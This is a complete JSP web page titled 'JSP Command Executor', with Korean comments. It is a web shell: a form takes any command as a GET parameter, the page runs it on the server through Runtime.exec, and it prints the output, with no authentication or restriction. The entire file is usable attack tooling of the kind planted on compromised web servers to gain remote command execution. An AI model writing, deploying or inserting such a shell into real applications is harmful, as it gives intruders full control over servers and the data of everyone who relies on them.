<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<!DOCTYPE html>
<html>
<head>
    <title>JSP Command Executor</title>
</head>
<body>
    <h2>Command Input</h2>
    <!-- 명령어 입력을 위한 폼 -->
    <form method="GET">
        <input type="text" name="cmd" style="width: 400px;" placeholder="명령어를 입력하세요 (예: dir, ls, whoami)">
        <input type="submit" value="실행">
    </form>

    <hr>

    <h3>Execution Result:</h3>
    <div style="background-color: #f4f4f4; padding: 10px;">
        <%
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.trim().isEmpty()) {
                try {
                    // OS 종류에 따른 처리 (Windows는 cmd /c, Linux는 /bin/sh -c 가 필요할 수 있음)
                    Process p = Runtime.getRuntime().exec(cmd);
                    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
                    
                    String line;
                    out.print("<pre>");
                    while ((line = in.readLine()) != null) {
                        out.println(line); // 명령어 결과 출력
                    }
                    out.print("</pre>");
                } catch (Exception e) {
                    out.println("에러 발생: " + e.getMessage());
                }
            }
        %>
    </div>
</body>
</html>
